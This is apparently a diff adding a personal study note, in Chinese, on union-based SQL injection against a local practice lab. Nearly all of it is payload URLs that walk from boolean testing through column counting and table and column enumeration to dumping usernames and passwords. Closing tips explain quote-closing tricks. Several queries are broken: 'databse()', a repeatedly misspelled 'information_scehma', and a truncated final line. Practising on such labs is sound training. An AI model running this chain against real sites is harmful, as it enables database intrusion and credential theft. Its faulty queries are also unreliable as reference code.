@@ -1,0 +1,29 @@
+http://127.0.0.1/sql/Less-1/?id=1 ' and 1=1 --+ 返回正常
+http://127.0.0.1/sql/Less-1/?id=1 ' and 1=2 --+ 返回失败
+http://127.0.0.1/sql/Less-1/?id=0 ' order by 3 --+ 获取位数3
+http://127.0.0.1/sql/Less-1/?id=0 ' union select 1,2,3 --+ 获取显位
+http://127.0.0.1/sql/Less-1/?id=0 ' union select 1,user(),databse() --+ 获取数据库名称和数据库用户 数据库用户为：root@localhost 数据库为：
+security
+http://127.0.0.1/sql/Less-1/?id=0 ' union select 1,table_name,3 from information_scehma.tables where table_schema=0x7365637572697479 limit 0,1 --+ 获取表，遍历limit获取所有表 有：ID表和email表和user表
+http://127.0.0.1/sql/Less-1/?id=0 ' union select 1,table_name,3 from information_scehma.tables where table_schema=0x7365637572697479 limit 1,1 --+
+http://127.0.0.1/sql/Less-1/?id=0 ' union select 1,table_name,3 from information_scehma.tables where table_schema=0x7365637572697479 limit 2,1 --+
+
+http://127.0.0.1/sql/Less-1/?id=0 ' union select 1,column_name ,3 from information_scehma.columns where table_schema=0x7365637572697479 and table_name=0x7573657273 limit 0,1 --+ 遍历limit获取所有字段
+
+http://127.0.0.1/sql/Less-1/?id=0 ' union select 1,column_name ,3 from information_scehma.columns where table_schema=0x7365637572697479 and table_name=0x7573657273 limit 0,1 --+
+
+http://127.0.0.1/sql/Less-1/?id=0 ' union select 1,column_name ,3 from information_scehma.columns where table_schema=0x7365637572697479 and table_name=0x7573657273 limit 2,1 --+
+
+http://127.0.0.1/sql/Less-1/?id=0 ' union select 1,column_name ,3 from information_scehma.columns where table_schema=0x7365637572697479 and table_name=0x7573657273 limit 3,1 --+
+
+http://127.0.0.1/sql/Less-1/?id=0 ' union select 1,group_concat(username),group_concat(password) from users --+
+
+总结：
+以前一直以为用group_concat读取所表和字段是最好的，发现后面读的不是这个数据库的东西，所以一定要指定数据库读取，并且使用limit进行遍历，例子:limit 0,1。读字段和脱裤都要这样,如果加了limit 后数据库出不来尝试在limit后面加注释，例如：limit 1,1 --+
+
+当limit逐个跑不出表或字段可以使用group_concat(table_name) group_concat(column_name)这个样子
+
+字符注入') --+闭合法,当字符型注入的时候发现'不行尝试各种闭合方法，说不定就行了
+http://127.0.0.1/sql/Less-3/?id=0%20%27%20)%20union%20select%201,group_concat(username),group_concat(password)%20from%20users%20--+
+
+http://127.0.0.1/sql/Less-3/?id=1 ') and 1= --+
